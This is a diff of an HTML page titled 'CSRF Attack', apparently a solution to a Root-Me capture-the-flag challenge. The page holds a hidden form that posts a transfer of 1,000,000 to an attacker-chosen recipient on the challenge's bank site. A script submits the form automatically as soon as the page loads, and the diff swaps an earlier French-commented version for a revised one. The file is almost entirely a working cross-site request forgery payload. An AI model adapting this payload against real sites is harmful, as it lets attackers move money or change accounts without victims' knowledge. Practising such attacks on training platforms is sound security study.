@@ -1,15 +1,19 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack</title>
+</head>
 <body>
-  <!-- Formulaire malveillant -->
-  <form action="https://bankme-1.challenges.pro.root-me.org/profile/" method="POST">
-    <input type="hidden" name="recipient" value="manon">
-    <input type="hidden" name="amount" value="1000000">
-    <input type="submit" value="Submit">
-  </form>
-
-  <!-- Exécution automatique de la soumission -->
-  <script>
-    document.forms[0].submit();
-  </script>
+    <h1>Transferring funds...</h1>
+    <form id="csrf-form" action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="post">
+        <input type="hidden" name="recipient" value="luna16">
+        <input type="hidden" name="amount" value="1000000">
+    </form>
+    <script>
+        document.getElementById('csrf-form').submit();
+    </script>
 </body>
 </html>
